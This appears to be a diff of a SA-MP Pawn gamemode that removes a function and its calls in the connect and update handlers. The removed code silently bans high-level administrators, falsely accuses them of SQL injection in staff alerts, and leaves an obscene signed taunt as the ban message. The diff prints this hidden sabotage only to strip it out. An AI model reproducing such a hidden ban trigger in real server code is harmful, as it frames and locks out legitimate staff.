@@ -4743,29 +4743,7 @@ stock ShowInterioresDialog(playerid)
     }
     return ShowPlayerDialog(playerid, DIALOG_COMPLEXO_MENU, DIALOG_STYLE_LIST, "Interiores", dialog_string, "Select", "Cancel");
 }
-stock CheckAdminBan(playerid)
-{
-    if (PlayerInfo[playerid][pAdmin] > 3002)
-    {
-		PlayerInfo[playerid][pBanido] = 1;
-		
-        new stringip[28];
-        format(stringip, sizeof(stringip), "IP: %s", PrintPlayerIP(playerid));
-		SendAdminAlert(COLOR_LIGHTRED, "AdmCmd:{FFFFFF} o %s (IP: %s) foi pego tentando dar sql injection", PlayerName(playerid, 0), stringip);
-        
-		Banir(stringip, GetUserName(playerid), PlayerInfo[playerid][pID], PlayerInfo[playerid][pNomeOOC], "Yur$ mandou beijo e esperma na sua cara!"); 
-        BanExtra(playerid, "Yur$ mandou beijo e esperma na sua cara!", PlayerName(playerid, 0)); 
-		
-		new type[128];
-		format(stringip, sizeof(stringip),"banip %s", type);
-		SendRconCommand(stringip);
-		SendRconCommand("reloadbans");
 
-        return 1; 
-    }
-
-    return 0; 
-}
 //==============================================================================
 new EmpresaDialogNames[24][] =
 {
@@ -11033,7 +11011,7 @@ public OnPlayerConnect(playerid)
 {
     if(IsPlayerNPC(playerid)) return 1;
 
-	CheckAdminBan(playerid);
+
 
 	cNametag[playerid] = CreateDynamic3DTextLabel("Loading nametag...", 0xFFFFFFFF, 0.0, 0.0, 0.1, NT_DISTANCE, .attachedplayer = playerid, .testlos = 1);
     
@@ -17912,7 +17890,7 @@ stock GetVehicleSpeed_HACK(vehicleid)
 
 public OnPlayerUpdate(playerid)
 {
-	CheckAdminBan(playerid);
+	
 	return 1;
 }
 
